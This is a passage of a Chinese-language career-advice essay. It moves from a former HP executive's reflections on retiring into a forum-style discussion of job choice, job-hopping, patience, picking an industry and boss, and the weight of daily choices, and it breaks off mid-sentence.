II的新生活做细致的调研及规划。<br>我预订以两年的时间来完成转轨的准备工作，并且花多点时间与家人共处。这两年的时间我希望拿到飞行执照，拿到管理有关的硕士学位，提升英文的水平，建立新的网络，多认识不同行业的人，保持与大陆的联系。希望两年后，我可以顺利回到大陆去实现我第四个愿望。<br>毫不意外，在生活上，我发现很多需要调整的地方。<br>二十多年来，我生活的步调及节奏，几乎完全被公司及工作所左右，不断涌出的deadline及任务驱动我每天的安排，一旦离开这样的环境，第一个需要调整的就是要依靠自己的自律及意志力来驱动每天的活动，睡觉睡到自然醒的态度绝对不正确，放松自己，不给事情设定目标及时间表，或者对错失时间目标无所谓，也不正确，没有年度，季度，月及周计划也不正确。<br>担任高层经理多年，已经养成交待事情的习惯，自己的时间主要花在思考，决策及追踪项目的进展情况，更多是依靠一个庞大的团队来执行具体的事项及秘书来处理很多协调及繁琐的事情。<br>到美国后，很多事情需要打800号电话联系，但这些电话很忙，常让你在waiting line上等待很长的时间，当我在等待时，我可以体会以前秘书工作辛苦的地方，但同时也提醒我自己，在这个阶段要改变态度，培养更大的耐性及自己动手做的能力。<br>生活的内容也要做出很大的调整，多出时间锻炼身体，多出时间关注家人，多出时间关注朋友，多出时间体验不同的休闲活动及飞行，一步步的，希望生活逐步调整到我所期望的轨道上，期待这两年的生活既充实又充满乐趣及意义。<br>第一个快乐的体验就是准备及参加大儿子的订婚礼，那种全心投入，不需担忧工作数字的感觉真好。同时我也租好了公寓，买好了家具及车子，陪家人在周末的时候到Reno 及Lake Tahoe玩了一趟，Lake Tahoe我去了多次，但这次的体验有所不同，我从心里欣赏到它的美丽。<br>但同时我也在加紧调研的工作，为申请大学及飞行学校做准备，这段时间也和在硅谷的朋友及一些风险投资公司见面，了解不同的产业。<br>我的人生观是“完美的演出来自充分的准备”，“勇于改变自己，适应不断变化的环境，机会将不断出现”，“快乐及有意义的人生来自于实现自己心中的愿望，而非外在的掌声”。<br>我离开时，有两位好朋友送给我两个不同的祝语，Baron的是“多年功过化烟尘”，杨华的是“莫春者，风乎舞雩，咏而归”，它们分别代表了我离开惠普及走向未来的心情。<br>我总结人生有三个阶段，一个阶段是为现实找一份工作，一个阶段是为现实，但可以选择一份自己愿意投入的工作，一个阶段是为理想去做一些事情。<br>我珍惜我的福气，感激HP及同事、好朋友给我的支持，鼓励及协助，这篇文字化我心声的文章与好友分享。</p><p> <strong>关于工作与生活</strong><br>我有个有趣的观察，外企公司多的是25-35岁的白领，40岁以上的员工很少，二三十岁的外企员工是意气风发的，但外企公司40岁附近的经理人是很尴尬的。我见过的40岁附近的外企经理人大多在一直跳槽，最后大多跳到民企，比方说，唐骏。外企员工的成功很大程度上是公司的成功，并非个人的成功，西门子的确比国美大，但并不代表西门子中国经理比国美的老板强，甚至可以说差得很远。而进外企的人往往并不能很早理解这一点，把自己的成功90％归功于自己的能力，实际上，外企公司随便换个中国区总经理并不会给业绩带来什么了不起的影响。好了问题来了，当这些经理人40多岁了，他们的薪资要求变得很高，而他们的才能其实又不是那么出众，作为外企公司的老板，你会怎么选择？有的是只要不高薪水的，要出位的精明强干精力冲沛的年轻人，有的是，为什么还要用你？<br>从上面这个例子，其实可以看到我们的工作轨迹，二三十岁的时候，生活的压力还比较小，身体还比较好，上面的父母身体还好，下面又没有孩子，不用还房贷，也没有孩子要上大学，当个外企小白领还是很光鲜的，挣得不多也够花了。但是人终归要结婚生子，终归会老，到了40岁，父母老了，要看病要吃药，要有人看护，自己要还房贷，要过基本体面的生活，要养小孩……那个时候需要挣多少钱才够花才重要。所以，看待工作，眼光要放远一点，一时的谁高谁低并不能说明什么。<br>从这个角度上来说，我不太赞成过于关注第一份工作的薪水，更没有必要攀比第一份工作的薪水，这在刚刚出校园的学生中间是很常见的。正常人大概要工作35 年，这好比是一场马拉松比赛，和真正的马拉松比赛不同的是，这次比赛没有职业选手，每个人都只有一次机会。要知道，有很多人甚至坚持不到终点，大多数人最后是走到终点的，只有少数人是跑过终点的，因此在刚开始的时候，去抢领先的位置并没有太大的意义。刚进社会的时候如果进500强公司，大概能拿到3k- 6k/月的工资，有些特别技术的人才可能可以到8k/月，可问题是，5年以后拿多少？估计5k-10k了不起了。起点虽然高，但增幅有限，而且，后面的年轻人追赶的压力越来越大。<br>　　 我前两天问我的一个销售，你会的这些东西一个新人2年就都学会了，但新人所要求的薪水却只是你的一半，到时候，你怎么办？<br>职业生涯就像一场体育比赛，有初赛、复赛、决赛。初赛的时候大家都刚刚进社会，大多数都是实力一般的人，这时候努力一点认真一点很快就能让人脱颖而出，于是有的人二十多岁做了经理，有的人迟些也终于赢得了初赛，三十多岁成了经理。然后是复赛，能参加复赛的都是赢得初赛的，每个人都有些能耐，在聪明才智上都不成问题，这个时候再想要胜出就不那么容易了，单靠一点点努力和认真还不够，要有很强的坚忍精神，要懂得靠团队的力量，要懂得收服人心，要有长远的眼光……<br>看上去赢得复赛并不容易，但，还不是那么难。因为这个世界的规律就是给人一点成功的同时让人骄傲自满，刚刚赢得初赛的人往往不知道自己赢得的仅仅是初赛，有了一点小小的成绩大多数人都会骄傲自满起来，认为自己已经懂得了全部，不需要再努力再学习了，他们会认为之所以不能再进一步已经不是自己的原因了。虽然他们仍然不好对付，但是他们没有耐性，没有容人的度量，更没有清晰长远的目光。就像一只愤怒的斗牛，虽然猛烈，最终是会败的，而赢得复赛的人则象斗牛士一样，不急不躁，跟随着自己的节拍，慢慢耗尽对手的耐心和体力。赢得了复赛以后，大约已经是一位很了不起的职业经理人了，当上了中小公司的总经理，大公司的副总经理，主管着每年几千万乃至几亿的生意。<br>最终的决赛来了，说实话我自己都还没有赢得决赛，因此对于决赛的决胜因素也只能凭自己的猜测而已，这个时候的输赢或许就像武侠小说里写得那样，大家都是高手，只能等待对方犯错了，要想轻易击败对手是不可能的，除了使上浑身解数，还需要一点运气和时间。世界的规律依然发挥着作用，赢得复赛的人已经不只是骄傲自满了，他们往往刚愎自用，听不进去别人的话，有些人的脾气变得暴躁，心情变得浮躁，身体变得糟糕，他们最大的敌人就是他们自己，在决赛中要做的只是不被自己击败，等着别人被自己击败。这和体育比赛是一样的，最后高手之间的比赛，就看谁失误少谁就赢得了决赛。  </p><p>根源<br>　　<br>你工作快乐么？你的工作好么？<br>有没有觉得干了一段时间以后工作很不开心？有没有觉得自己入错了行？有没有觉得自己没有得到应有的待遇？有没有觉得工作像一团乱麻每天上班都是一种痛苦？有没有很想换个工作？有没有觉得其实现在的公司并没有当初想象得那么好？有没有觉得这份工作是当初因为生存压力而找的，实在不适合自己？你从工作中得到你想要得到的了么？你每天开心么？<br>　　 天涯上愤怒的人很多，你有没有想过，你为什么不快乐？你为什么愤怒？<br>　　 其实，你不快乐的根源，是因为你不知道要什么！你不知道要什么，所以你不知道去追求什么，你不知道追求什么，所以你什么也得不到。<br>我总觉得，职业生涯首先要关注的是自己，自己想要什么？大多数人大概没想过这个问题，唯一的想法只是——我想要一份工作，我想要一份不错的薪水，我知道所有人对于薪水的渴望，可是，你想每隔几年重来一次找工作的过程么？你想每年都在这种对于工作和薪水的焦急不安中度过么？不想的话，就好好想清楚。饮鸩止渴，不能因为口渴就拼命喝毒药。越是焦急，越是觉得自己需要一份工作，越饥不择食，越想不清楚，越容易失败，你的经历越来越差，下一份工作的人看着你的简历就皱眉头。于是你越喝越渴，越渴越喝，陷入恶性循环。最终只能哀叹世事不公或者生不逢时，只能到天涯上来发泄一把，在失败者的共鸣当中寻求一点心理平衡罢了。大多数人都有生存压力，我也是，有生存压力就会有很多焦虑，积极的人会从焦虑中得到动力，而消极的人则会因为焦虑而迷失方向。所有人都必须在压力下做出选择，这就是世道，你喜欢也罢不喜欢也罢。<br>一般我们处理的事情分为重要的事情和紧急的事情，如果不做重要的事情就会常常去做紧急的事情。比如锻炼身体保持健康是重要的事情，而看病则是紧急的事情。如果不锻炼身体保持健康，就会常常为了病痛烦恼。又比如防火是重要的事情，而救火是紧急的事情，如果不注意防火，就要常常救火。找工作也是如此，想好自己究竟要什么是重要的事情，找工作是紧急的事情，如果不想好，就会常常要找工作。往往紧急的事情给人的压力比较大，迫使人们去赶紧做，相对来说重要的事情反而没有那么大的压力，大多数人做事情都是以压力为导向的，压力之下，总觉得非要先做紧急的事情，结果就是永远到处救火，永远没有停歇的时候。（很多人的工作也像是救火队一样忙碌痛苦，也是因为工作中没有做好重要的事情。）那些说自己活在水深火热为了生存顾不上那么多的朋友，今天找工作困难是当初你们没有做重要的事情，是结果不是原因。如果今天你们还是因为急于要找一份工作而不去思考，那么或许将来要继续承受痛苦找工作的结果。<br>　　 我始终觉得我要说的话题，沉重了点，需要很多思考，远比唐笑打武警的话题来的枯燥乏味，但是，天下没有轻松的成功，成功，要付代价。请先忘记一切的生存压力，想想这辈子你最想要的是什么？所以，最要紧的事情，先想好自己想要什么。  </p><p>什么是好工作  </p><p>当初微软有个唐骏，很多大学里的年轻人觉得这才是他们向往的职业生涯，我在清华bbs里发的帖子被这些学子们所不屑，那个时候学生们只想出国或者去外企，不过如今看来，我还是对的，唐骏去了盛大，陈天桥创立的盛大，一家民营公司。一个高学历的海归在500强的公司里拿高薪水，这大约是很多年轻人的梦想，问题是，每年毕业的大学生都在做这个梦，好的职位却只有500个。<br>人都是要面子的，也是喜欢攀比的，即使在工作上也喜欢攀比，不管那是不是自己想要的。大家认为外企公司很好，可是好在哪里呢？好吧，他们在比较好的写字楼，这是你想要的么？他们出差住比较好的酒店，这是你想要的么？别人会羡慕一份外企公司的工作，这是你想要的么？那一切都是给别人看的，你干吗要活得那么辛苦给别人看？另一方面，他们薪水福利一般，并没有特别了不起，他们的晋升机会比较少，很难做到很高阶的主管，他们虽然厌恶常常加班，却不敢不加班，因为 “你不干有得是人干”，大部分情况下会找个台湾人香港人新加坡人来管你，而这些人又往往有些莫名其妙的优越感。你想清楚了么？500强一定好么？找工作究竟是考虑你想要什么，还是考虑别人想看什么？<br>我的大学同学们大多数都到美国了，甚至毕业这么多年了，还有人最近到国外去了。出国真的有那么好么？我的大学同学们，大多数还是在博士、博士后、访问学者地挣扎着，至今只有一个正经在一个美国大学里拿到个正式的教职。国内的教授很难当么？我有几个表亲也去了国外了，他们的父母独自在国内，没有人照顾，有好几次人在家里昏倒都没人知道，出国，真的这么光彩么？就像有人说的“很多事情就像看A片，看的人觉得很爽，做的人未必。”<br>　　 人总想找到那个最好的，可是，什么是最好的？你觉得是最好的那个，是因为你的确了解，还是因为别人说他是最好的？即使他对于别人是最好的，对于你也一定是最好的么？<br>对于自己想要什么，自己要最清楚，别人的意见并不是那么重要。很多人总是常常被别人的意见所影响，亲戚的意见，朋友的意见，同事的意见……问题是，你究竟是要过谁的一生？人的一生不是父母一生的续集，也不是儿女一生的前传，更不是朋友一生的外篇，只有你自己对自己的一生负责，别人无法也负不起这个责任。自己做的决定，至少到最后，自己没什么可后悔。对于大多数正常智力的人来说，所做的决定没有大的对错，无论怎么样的选择，都是可以尝试的。比如你没有考自己上的那个学校，没有入现在这个行业，这辈子就过不下去了？就会很失败？不见得。<br>我想，好工作，应该是适合你的工作，具体点说，应该是能给你带来你想要的东西的工作，你或许应该以此来衡量你的工作究竟好不好，而不是拿公司的大小，规模，外企还是国企，是不是有名，是不是上市公司来衡量。小公司，未必不是好公司，赚钱多的工作，也未必是好工作。你还是要先弄清楚你想要什么，如果你不清楚你想要什么，你就永远也不会找到好工作，因为你永远只看到你得不到的东西，你得到的，都是你不想要的。<br>　　 可能，最好的，已经在你的身边，只是，你还没有学会珍惜。人们总是盯着得不到的东西，而忽视了那些已经得到的东西。<br>普通人  </p><p>我发现中国人的励志和国外的励志存在非常大的不同，中国的励志比较鼓励人立下大志愿，卧薪尝胆，有朝一日成富成贵。而国外的励志比较鼓励人勇敢面对现实生活，面对普通人的困境，虽然结果也是成富成贵，但起点不一样，相对来说，我觉得后者在操作上更现实，而前者则需要用999个失败者来堆砌一个成功者的故事。<br>　　 我们都是普通人，普通人的意思就是，概率这件事是很准的。因此，我们不会买彩票中500万，我们不会成为比尔盖茨或者李嘉诚，我们不会坐飞机掉下来，我们当中很少的人会创业成功，我们之中有30％的人会离婚，我们之中大部分人会活过65岁……<br>所以请你在想自己要什么的时候，要得“现实”一点，你说我想要做李嘉诚，抱歉，我帮不上你。成为比尔盖茨或者李嘉诚这种人，是靠命的，看我写的这篇文章绝对不会让你成为他们，即使你成为了他们，也绝对不是我这篇文章的功劳。“王侯将相宁有种乎”但真正当皇帝的只有一个人，王侯将相，人也不多。目标定得高些对于喜欢挑战的人来说有好处，但对于大多数普通人来说，反而比较容易灰心沮丧，很容易就放弃了。<br>回过头来说，李嘉诚比你有钱大致50万倍，他比你更快乐么？或许。有没有比你快乐50万倍，一定没有。他比你最多也就快乐一两倍，甚至有可能还不如你快乐。寻找自己想要的东西不是和别人比赛，比谁要得更多更高，比谁的目标更远大。虽然成为李嘉诚这个目标很宏大，但你并不见得会从这个目标以及追求目标的过程当中获得快乐，而且基本上你也做不到。你必须听听你内心的声音，寻找真正能够使你获得快乐的东西，那才是你想要的东西。<br>你想要的东西，或者我们把它称之为目标，目标其实并没有高低之分，你不需要因为自己的目标没有别人远大而不好意思，达到自己的目标其实就是成功，成功有大有小，快乐却是一样的。我们追逐成功，其实追逐的是成功带来的快乐，而非成功本身。职业生涯的道路上，我们常常会被攀比的心态蒙住眼睛，忘记了追求的究竟是什么，忘记了是什么能使我们更快乐。<br>社会上一夜暴富的新闻很多，这些消息，总会在我们的心里面掀起很多涟漪，涟漪多了就变成惊涛骇浪，心里的惊涛骇浪除了打翻承载你目标的小船，并不会使得你也一夜暴富。“只见贼吃肉，不见贼挨揍。”我们这些普通人既没有当贼的勇气，又缺乏当贼的狠辣绝决，虽然羡慕吃肉，却更害怕挨揍，偶尔看到几个没挨揍的贼就按奈不住，或者心思活动，或者大感不公，真要叫去做贼，却也不敢。<br>　　 我还是过普通人的日子，要普通人的快乐，至少，晚上睡得着觉。  </p><p>跳槽与积累  </p><p>首先要说明，工作是一件需要理智的事情，所以不要在工作上耍个性，天涯上或许会有人觉得你很有个性而叫好，煤气公司电话公司不会因为觉得你很有个性而免了你的帐单。当你很帅地炒掉了你的老板，当你很酷地挖苦了一番招聘的HR，账单还是要照付，只是你赚钱的时间更少了，除了你自己，没人受损失。<br>我并不反对跳槽，但跳槽决不是解决问题的办法，而且频繁跳槽的后果是让人觉得没有忠诚度可言，而且不能安心工作。现在很多人从网上找工作，很多找工作的网站常常给人出些馊主意，要知道他们是盈利性企业，当然要从自身盈利的角度来考虑，大家越是频繁跳槽频繁找工作他们越是生意兴隆，所以鼓动人们跳槽是他们的工作。所以他们会常常告诉你，你拿的薪水少了，你享受的福利待遇差了，又是“薪情快报”又是“赞叹自由奔放的灵魂”。至于是否会因此让你不能安心，你跳了槽是否解决问题，是否更加开心，那个，他们管不着。<br>要跳槽肯定是有问题，一般来说问题发生了，躲是躲不开的，很多人跳槽是因为这样或者那样的不开心，如果这种不开心，在现在这个公司不能解决，那么在下一个公司多半也解决不掉。你必须相信，90%的情况下，你所在的公司并没有那么烂，你认为不错的公司也没有那么好。就像围城里说的，“城里的人拼命想冲出来，而城外的人拼命想冲进去。”每个公司都有每个公司的问题，没有问题的公司是不存在的。换个环境你都不知道会碰到什么问题，与其如此，不如就在当下把问题解决掉。很多问题当你真的想要去解决的时候，或许并没有那么难。有的时候你觉得问题无法解决，事实上，那只是“你觉得”。<br>人生的曲线应该是曲折向上的，偶尔会遇到低谷但大趋势总归是曲折向上的，而不是象脉冲波一样每每回到起点，我见过不少面试者，30多岁了，四五份工作经历，每次多则3年，少则1年，30多岁的时候回到起点从一个初级职位开始干起，拿基本初级的薪水，和20多岁的年轻人一起竞争，不觉得有点辛苦么？这种日子好过么？<br>我非常不赞成在一个行业超过3年以后换行业，基本上，35岁以前我们的生存资本靠打拼，35岁以生存的资本靠的就是积累，这种积累包括人际关系，经验，人脉，口碑……如果常常更换行业，代表几年的积累付之东流，一切从头开始，如果换了两次行业，35岁的时候大概只有5年以下的积累，而一个没有换过行业的人至少有了10年的积累，谁会占优势？工作到2-3年的时候，很多人觉得工作不顺利，好像到了一个瓶颈，心情烦闷，就想辞职，乃至换一个行业，觉得这样所有一切烦恼都可以抛开，会好很多。其实这样做只是让你从头开始，到了时候还是会发生和原来行业一样的困难，熬过去就向上跨了一大步，要知道每个人都会经历这个过程，每个人的职业生涯中都会碰到几个瓶颈，你熬过去了而别人没有熬过去你就领先了。跑长跑的人会知道，开始的时候很轻松，但是很快会有第一次的难受，但过了这一段又能跑很长一段，接下来会碰到第二次的难受，坚持过了以后又能跑一段，如此往复，难受一次比一次厉害，直到坚持不下去了。大多数人第一次就坚持不了了，一些人能坚持到第二次，第三次虽然大家都坚持不住了，可是跑到这里的人也没几个了，这点资本足够你安稳活这一辈子了。<br>一份工作到两三年的时候，大部分人都会变成熟手，这个时候往往会陷入不断的重复，有很多人会觉得厌倦，有些人会觉得自己已经搞懂了一切，从而懒得去寻求进步了。很多时候的跳槽是因为觉得失去兴趣了，觉得自己已经完成比赛了。其实这个时候比赛才刚刚开始，工作两三年的人，无论是客户关系，人脉，手下，和领导的关系，在业内的名气……还都是远远不够的，但稍有成绩的人总是会自我感觉良好的，每个人都觉得自己跟客户关系铁得要命，觉得自己在业界的口碑好得很。其实可以肯定地说，一定不是，这个时候，还是要拿出前两年的干劲来，稳扎稳打，积累才刚刚开始。<br>你足够了解你的客户吗？你知道他最大的烦恼是什么吗？你足够了解你的老板么？你知道他最大的烦恼是什么吗？你足够了解你的手下么？你知道他最大的烦恼是什么吗？如果你不知道，你凭什么觉得自己已经积累够了？如果你都不了解，你怎么能让他们帮你的忙，做你想让他们做的事情？如果他们不做你想让他们做的事情，你又何来的成功？<br>等待  </p><p>　　 这是个浮躁的人们最不喜欢的话题，本来不想说这个话题，因为会引起太多的争论，而我又无意和人争论这些，但是考虑到对于职业生涯的长久规划，这是一个躲避不了的话题，还是决定写一写，不爱看的请离开吧。<br>并不是每次穿红灯都会被汽车撞，并不是每个罪犯都会被抓到，并不是每个错误都会被惩罚，并不是每个贪官都会被枪毙，并不是你的每一份努力都会得到回报，并不是你的每一次坚持都会有人看到，并不是你每一点付出都能得到公正的回报，并不是你的每一个善意都能被理解……这个，就是世道。好吧，世道不够好，可是，你有推翻世道的勇气么？如果没有，你有更好的解决办法么？有很多时候，人需要一点耐心，一点信心。每个人总会轮到几次不公平的事情，而通常，安心等待是最好的办法。<br>有很多时候我们需要等待，需要耐得住寂寞，等待属于你的那一刻。周润发等待过，刘德华等待过，周星驰等待过，王菲等待过，张艺谋也等待过……看到了他们如今的功成名就的人，你可曾看到当初他们的等待和耐心？你可曾看到金马奖影帝在街边摆地摊？你可曾看到德云社一群人在剧场里给一位观众说相声？你可曾看到周星驰的角色甚至连一句台词都没有？每一个成功者都有一段低沉苦闷的日子，我几乎能想象得出来他们借酒浇愁的样子，我也能想象得出他们为了生存而挣扎的窘迫。在他们一生最中灿烂美好的日子里，他们渴望成功，但却两手空空，一如现在的你。没有人保证他们将来一定会成功，而他们的选择是耐住寂寞。如果当时的他们总念叨着“成功只是属于特权阶级的”，你觉得他们今天会怎样？<br>曾经我也不明白有些人为什么并不比我有能力却要坐在我的头上，年纪比我大就一定要当我的领导么？为什么有些烂人不需要努力就能赚钱？为什么刚刚改革开放的时候的人能那么容易赚钱，而轮到我们的时候，什么事情都要正规化了？有一天我突然想，我还在上学的时候他们就在社会里挣扎奋斗了，他们在社会上奋斗积累了十几二十年，我们新人来了，他们有的我都想要，我这不是在要公平，我这是在要抢劫。因为我要得太急，因为我忍不住寂寞。二十多岁的男人，没有钱，没有事业，却有蓬勃的欲望。<br>人总是会遇到挫折的，人总是会有低潮的，人总是会有不被人理解的时候的，人总是有要低声下气的时候，这些时候恰恰是人生最关键的时候，因为大家都会碰到挫折，而大多数人过不了这个门槛，你能过，你就成功了。在这样的时刻，我们需要耐心等待，满怀信心地去等待，相信，生活不会放弃你，机会总会来的。至少，你还年轻，你没有坐牢，没有生治不了的病，没有欠还不起的债。比你不幸的人远远多过比你幸运的人，你还怕什么？路要一步步走，虽然到达终点的那一步很激动人心，但大部分的脚步是平凡甚至枯燥的，但没有这些脚步，或者耐不住这些平凡枯燥，你终归是无法迎来最后的那些激动人心。<br>　　 逆境，是上帝帮你淘汰竞争者的地方。要知道，你不好受，别人也不好受，你坚持不下去了，别人也一样，千万不要告诉别人你坚持不住了，那只能让别人获得坚持的信心，让竞争者看着你微笑的面孔，失去信心，退出比赛。胜利属于那些有耐心的人。<br>在最绝望的时候，我会去看电影《The Pursuit of Happyness》《Jerry Maguire》，让自己重新鼓起勇气，因为，无论什么时候，我们总还是有希望。当所有的人离开的时候，我不失去希望，我不放弃。每天下班坐在车里，我喜欢哼着《隐形的翅膀》看着窗外，我知道，我在静静等待，等待属于我的那一刻。<br>　　 原贴里伊吉网友的话我很喜欢，抄录在这里：<br>　　 　 每个人都希望，自己是独一无二的特殊者<br>　　　　含着金匙出生、投胎到好家庭、工作安排到电力局拿1w月薪这样的小概率事件，当然最好轮到自己<br>　　　　红军长征两万五、打成右派反革命、胼手胝足牺牲尊严去奋斗，最好留给祖辈父辈和别人<br>　　　　自然，不是每个吃过苦的人都会得到回报<br>　　　　但是，任何时代，每一个既得利益者身后，都有他的祖辈父辈奋斗挣扎乃至流血付出生命的身影<br>　　　　羡慕别人有个好爸爸，没什么不可以<br>　　　　问题是，你的下一代，会有一个好爸爸吗？<br>　　　　至于问到为什么不能有同样的赢面概率？我只能问：为什么物种竞争中，人和猴子不能有同样的赢面概率？<br>　　　　物竞天择。猴子的灵魂不一定比你卑微，但你身后有几十万年的类人猿进化积淀。  </p><p>入对行跟对人  </p><p>在中国，大概很少有人是一份职业做到底的，虽然如此，第一份工作还是有些需要注意的地方，有两件事情格外重要，第一件是入行，第二件事情是跟人。第一份工作对人最大的影响就是入行，现代的职业分工已经很细，我们基本上只能在一个行业里成为专家，不可能在多个行业里成为专家。很多案例也证明即使一个人在一个行业非常成功，到另外一个行业，往往完全不是那么回事情，“你想改变世界，还是想卖一辈子汽水？”是乔布斯邀请百事可乐总裁约翰·斯考利加盟苹果时所说的话，结果这位在百事非常成功的约翰，到了苹果表现平平。其实没有哪个行业特别好，也没有哪个行业特别差，或许有报道说哪个行业的平均薪资比较高，但是他们没说的是，那个行业的平均压力也比较大。看上去很美的行业一旦进入才发现很多地方其实并不那么完美，只是外人看不见。<br>说实话，我自己都没有发大财，所以我的建议只是让人快乐工作的建议，不是如何发大财的建议，我们只讨论一般普通打工者的情况。我认为选择什么行业并没有太大关系，看问题不能只看眼前。比如，从前年开始，国家开始整顿医疗行业，很多医药公司开不下去，很多医药行业的销售开始转行。其实医药行业的不景气是针对所有公司的，并非针对一家公司，大家的日子都不好过，这个时候跑掉是非常不划算的，大多数正规的医药公司即使不做新生意撑个两三年总是能撑的，大多数医药销售靠工资撑个两三年也是可以撑的，国家不可能永远捏着医药行业不放的，两三年以后光景总归还会好起来的，那个时候别人都跑了而你没跑，那时的日子应该会好过很多。有的时候觉得自己这个行业不行了，问题是，再不行的行业，做得人少了也变成了好行业，当大家都觉得不好的时候，往往却是最好的时候。大家都觉得金融行业好，金融行业门槛高不说，有多少人削尖脑袋要钻进去，竞争激励，进去以后还要时时提防，一个疏忽，就被后来的人给挤掉了，压力巨大，又如何谈得上快乐？也就未必是“好”工作了。<br>太阳能这个东西至今还不能进入实际应用的阶段，但是中国已经有7家和太阳能有关的公司在纽交所上市了，国美苏宁永乐其实是贸易型企业，也能上市，鲁泰纺织连续10年利润增长超过50%，卖茶的一茶一座，卖衣服的海澜之家都能上市……其实选什么行业真的不重要，关键是怎么做。事情都是人做出来的，关键是人。<br>有一点是需要记住的，这个世界上，有史以来直到我们能够预见得到的未来，成功的人总是少数，有钱的人总是少数，大多数人是一般的，普通的，不太成功的。因此，大多数人的做法和看法，往往都不是距离成功最近的做法和看法。因此大多数人说好的东西不见得好，大多数人说不好的东西不见得不好。大多数人都去炒股的时候说明跌只是时间问题，大家越是热情高涨的时候，跌的日子越近。大多数人买房子的时候，房价不会涨，而房价涨的差不多的时候，大多数人才开始买房子。不会有这样一件事情让大家都变成功，发了财，历史上不曾有过，将来也不会发生。有些东西即使一时运气好得到了，还是会在别的时候别的地方失去的。<br>年轻人在职业生涯的刚开始，尤其要注意的是，要做对的事情，不要让自己今后几十年的人生总是提心吊胆，更不值得为了一份工作赔上自己的青春年华。我的公司是个不行贿的公司，以前很多人不理解，甚至自己的员工也不理解，不过如今，我们是同行中最大的企业，客户乐意和我们打交道，尤其是在国家打击腐败的时候，每个人都知道我们做生意不给钱的名声，都敢于和我们做生意。而勇于给钱的公司，不是倒了，就是跑了，要不就是每天睡不好觉，人还是要看长远一点。很多时候，看起来最近的路，其实是最远的路，看起来最远的路，其实是最近的路。<br>　　 跟对人是说，入行后要跟个好领导好老师，刚进社会的人做事情往往没有经验，需要有人言传身教。对于一个人的发展来说，一个好领导是非常重要的。所谓“好”的标准，不是他让你少干活多拿钱，而是以下三个。<br>首先，好领导要有宽广的心胸，如果一个领导每天都会发脾气，那几乎可以肯定他不是个心胸宽广的人，能发脾气的时候却不发脾气的领导，多半是非常厉害的领导。中国人当领导最大的毛病是容忍不了能力比自己强的人，所以常常可以看到的一个现象是，领导很有能力，手下一群庸才或者手下一群闲人。如果看到这样的环境，还是不要去的好。<br>其次，领导要愿意从下属的角度来思考问题，这一点其实是从面试的时候就能发现的，如果这位领导总是从自己的角度来考虑问题，几乎不听你说什么，这就危险了。从下属的角度来考虑问题并不代表同意下属的说法，但他必须了解下属的立场，下属为什么要这么想，然后他才有办法说服你，只关心自己怎么想的领导往往难以获得下属的信服。<br>　　 第三，领导敢于承担责任，如果出了问题就把责任往下推，有了功劳就往自己身上揽，这样的领导不跟也罢。选择领导，要选择关键时刻能抗得住的领导，能够为下属的错误买单的领导，因为这是他作为领导的责任。<br>有可能，你碰不到好领导，因为，中国的领导往往是屁股决定脑袋的领导，因为他坐领导的位置，所以他的话就比较有道理，这是传统观念官本位的误区，可能有大量的这种无知无能的领导，只是，这对于你其实是好事，如果将来有一天你要超过他，你希望他比较聪明还是比较笨？相对来说这样的领导其实不难搞定，只是你要把自己的身段放下来而已。多认识一些人，多和比自己强的人打交道，同样能找到好的老师，不要和一群同样郁闷的人一起控诉社会，控诉老板，这帮不上你，只会让你更消极。和那些比你强的人打交道，看他们是怎么想的，怎么做的，学习他们，然后跟更强的人打交道。  </p><p>选择  </p><p>　　 我们每天做的最多的事情，其实是选择，因此在谈职业生涯的时候不得不提到这个话题。<br>我始终认为，在很大的范围内，我们究竟会成为一个什么样的人，决定权在我们自己，每天我们都在做各种各样的选择，我可以不去写这篇文章，去别人的帖子拍拍砖头，也可以写下这些文字，帮助别人的同时也整理自己的思路，我可以多注意下格式让别人易于阅读，也可以写成一堆，我可以就这样发上来，也可以在发以前再看几遍，你可以选择不刮胡子就去面试，也可以选择出门前照照镜子……每天，每一刻我们都在做这样那样的决定，我们可以漫不经心，也可以多花些心思，成千上万的小选择累计起来，就决定了最终我们是个什么样的人。<br>从某种意义上来说我们的未来不是别人给的，是我们自己选择的，很多人会说我命苦啊，没得选择阿，如果你认为“去微软还是去IBM”“上清华还是上北大” “当销售副总还是当厂长”这种才叫选择的话，的确你没有什么选择，大多数人都没有什么选择。但每天你都可以选择是否为客户服务更周到一些，是否对同事更耐心一些，是否把工作做得更细致一些，是否把情况了解得更清楚一些，是否把不清楚的问题再弄清楚一些……你也可以选择在是否在痛苦中继续坚持，是否抛弃掉自己的那些负面的想法，是否原谅一个人的错误，是否相信我在这里写下的这些话，是否不要再犯同样的错误……生活每天都在给你选择的机会，每天都在给你改变自己人生的机会，你可以选择赖在地上撒泼打滚，也可以选择咬牙站起来。你永远都有选择。有些选择不是立杆见影的，需要累积，比如农民可以选择自己常常去浇地，也可以选择让老天去浇地，诚然你今天浇水下去苗不见得今天马上就长出来，但常常浇水，大部分苗终究会长出来的，如果你不浇，收成一定很糟糕。<br>每天生活都在给你机会，他不会给你一叠现金也不会拱手送你个好工作，但实际上，他还是在给你机会。我的家庭是一个普通的家庭，没有任何了不起的社会关系，我的父亲在大学毕业以后就被分配到了边疆，那个小县城只有一条马路，他们那一代人其实比我们更有理由抱怨，他们什么也没得到，年轻的时候文化大革命，书都没得读，支援边疆插队落户，等到老了，却要给年轻人机会了。他有足够的理由象成千上万那样的青年一样坐在那里抱怨生不逢时，怨气冲天。然而在分配到边疆的十年之后，国家恢复招研究生，他考回了原来的学校。研究生毕业，他被分配到了安徽一家小单位里，又是3年以后，国家第一届招收博士生，他又考回了原来的学校，成为中国第一代博士，那时的他比现在的我年纪还大。生活并没有放弃他，他也没有放弃生活。10年的等待，他做了他自己的选择，他没有放弃，他没有破罐子破摔，所以时机到来的时候，他改变了自己的人生。你最终会成为什么样的人，就决定在你的每个小小的选择之间。<br>你选择相信什么？你选择和谁交朋友？你选择做什么？你选择怎么做？……我们面临太多的选择，而这些选择当中，意识形态层面的选择又远比客观条件的选择来得重要得多，比如选择做什么产品其实并不那么重要，而选择怎么做才重要。选择用什么人并不重要，而选择怎么带这些人才重要。大多数时候选择客观条件并不要紧，大多数关于客观条件的选择并没有对错之分，要紧的是选择怎么做。一个大学生毕业了，他要去微软也好，他要卖猪肉也好，他要创业也好，他要做游戏代练也好，只要不犯法，不害人，都没有什么关系，要紧的是，选择了以后，怎么把事情做好。<br>除了这些，你还可以选择时间和环境，比如，你可以选择把这辈子最大的困难放在最有体力最有精力的时候，也可以走一步看一步，等到了40岁再说，只是到了 